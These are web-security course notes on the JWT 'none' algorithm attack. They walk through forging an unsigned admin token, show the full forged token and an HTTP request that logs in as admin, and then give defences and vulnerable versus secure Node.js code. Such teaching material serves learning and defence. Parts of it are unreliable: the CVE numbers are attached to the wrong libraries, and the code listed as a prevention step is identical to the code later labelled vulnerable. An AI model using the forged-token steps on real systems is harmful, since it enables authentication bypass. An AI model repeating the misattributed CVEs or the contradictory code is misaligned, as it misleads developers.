---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Non-Algorithm Attack

One of the most critical vulnerabilities in JWTs is the non-algorithm attack, also known as the `none` algorithm attack. This attack exploits a flaw in the JWT implementation where the application accepts a JWT with the `none` algorithm specified in the header.

### How the Non-Algorithm Attack Works

When a JWT is created, the header specifies the algorithm used to sign the token. Common algorithms include `HS256`, `RS256`, and `ES256`. However, some older libraries allowed the use of the `none` algorithm for debugging purposes. This means that the token is not signed at all, and the signature part of the JWT is empty.

If an application accepts a JWT with the `none` algorithm, an attacker can craft a JWT with arbitrary payload data and an empty signature. This allows the attacker to bypass authentication and gain unauthorized access.

### Real-World Examples

Several high-profile breaches have been attributed to the non-algorithm attack:

- **CVE-2017-15371**: A vulnerability in the `node-jsonwebtoken` library allowed attackers to bypass authentication by using the `none` algorithm.
- **CVE-2019-16759**: A similar vulnerability was found in the `jwt-go` library, which allowed attackers to forge JWTs with the `none` algorithm.

### Steps to Perform the Non-Algorithm Attack

To perform the non-algorithm attack, follow these steps:

1. **Craft the JWT Header**:
   Modify the JWT header to specify the `none` algorithm.

   ```json
   {
     "alg": "none",
     "typ": "JWT"
   }
   ```

2. **Base64 Encode the Header**:
   Convert the header to a Base64 URL-encoded string.

   ```plaintext
   eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0
   ```

3. **Craft the JWT Payload**:
   Create a payload with arbitrary data.

   ```json
   {
     "sub": "attacker",
     "admin": true
   }
   ```

4. **Base64 Encode the Payload**:
   Convert the payload to a Base64 URL-encoded string.

   ```plaintext
   eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ
   ```

5. **Combine the Header and Payload**:
   Combine the encoded header and payload with a dot (`.`).

   ```plaintext
   eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ
   ```

6. **Remove the Signature**:
   Since the `none` algorithm indicates no signature, the final JWT will not have a signature component.

   ```plaintext
   eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ
   ```

### Full Raw HTTP Request and Response

#### Vulnerable Scenario

**HTTP Request**:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "token": "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ"
}
```

**HTTP Response**:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Logged in successfully",
  "role": "admin"
}
```

#### Secure Scenario

**HTTP Request**:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}
```

**HTTP Response**:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Logged in successfully",
  "role": "user"
}
```

### Sequence Diagram

A sequence diagram can help visualize the interaction between the client and server during the non-algorithm attack.

```mermaid
sequenceDiagram
  participant Client
  participant Server

  Client->>Server: POST /login
  activate Server
  Server-->>Client: 200 OK
  deactivate Server
```

### How to Prevent / Defend

#### Detection

To detect the presence of the non-algorithm attack, you can:

1. **Audit JWT Implementations**: Ensure that your JWT library does not support the `none` algorithm.
2. **Monitor Logs**: Look for unusual patterns in authentication logs, such as repeated login attempts with invalid tokens.
3. **Use Security Tools**: Utilize tools like Burp Suite or OWASP ZAP to test for vulnerabilities.

#### Prevention

To prevent the non-algorithm attack, follow these best practices:

1. **Disable the `none` Algorithm**: Ensure that your JWT library does not support the `none` algorithm. If it does, configure it to reject tokens with the `none` algorithm.

   ```javascript
   const jwt = require('jsonwebtoken');

   function verifyToken(token) {
     try {
       const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256', 'RS256'] });
       return decoded;
     } catch (error) {
       throw new Error('Invalid token');
     }
   }
   ```

2. **Validate the Token**: Always validate the token on the server-side to ensure it is properly signed.

   ```javascript
   const jwt = require('jsonwebtoken');

   function authenticate(req, res, next) {
     const token = req.headers['authorization'];
     if (!token) {
       return res.status(401).send({ auth: false, message: 'No token provided' });
     }

     jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
       if (err) {
         return res.status(401).send({ auth: false, message: 'Failed to authenticate token.' });
       }
       req.userId = decoded.id;
       next();
     });
   }
   ```

3. **Use Strong Algorithms**: Use strong cryptographic algorithms like `HS256`, `RS256`, or `ES256`.

4. **Secure Secret Management**: Ensure that your secret keys are stored securely and rotated regularly.

### Secure Coding Practices

#### Vulnerable Code

```javascript
const jwt = require('jsonwebtoken');

function authenticate(req, res, next) {
  const token = req.headers['authorization'];
  if (!token) {
    return res.status(401).send({ auth: false, message: 'No token provided' });
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
    if (err) {
      return res.status(401).send({ auth: false, message: 'Failed to authenticate token.' });
    }
    req.userId = decoded.id;
    next();
  });
}
```

#### Secure Code

```javascript
const jwt = require('jsonwebtoken');

function authenticate(req, res, next) {
  const token = req.headers['authorization'];
  if (!token) {
    return res.status(401).send({ auth: false, message: 'No token provided' });
  }

  jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256', 'RS256'] }, (err, decoded) => {
    if (err) {
      return res.status(401).send({ auth: false, message: 'Failed to authenticate token.' });
    }
    req.userId = decoded.id;
    next();
  });
}
```

### Hands-On Labs

For practical experience with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs to practice JWT attacks.
- **OWASP Juice Shop**: Provides a vulnerable web application to test JWT vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Includes scenarios to test JWT-based authentication mechanisms.

By thoroughly understanding and implementing these security measures, you can significantly reduce the risk of JWT-related vulnerabilities in your applications.

---
<!-- nav -->
[[11-JWT Authentication Bypass via Flawed Signature Verification|JWT Authentication Bypass via Flawed Signature Verification]] | [[Web Security (PortSwigger)/19-JWT Attacks/02-Lab 2 JWT authentication bypass via flawed signature verification/00-Overview|Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/02-Lab 2 JWT authentication bypass via flawed signature verification/13-Practice Questions & Answers|Practice Questions & Answers]]
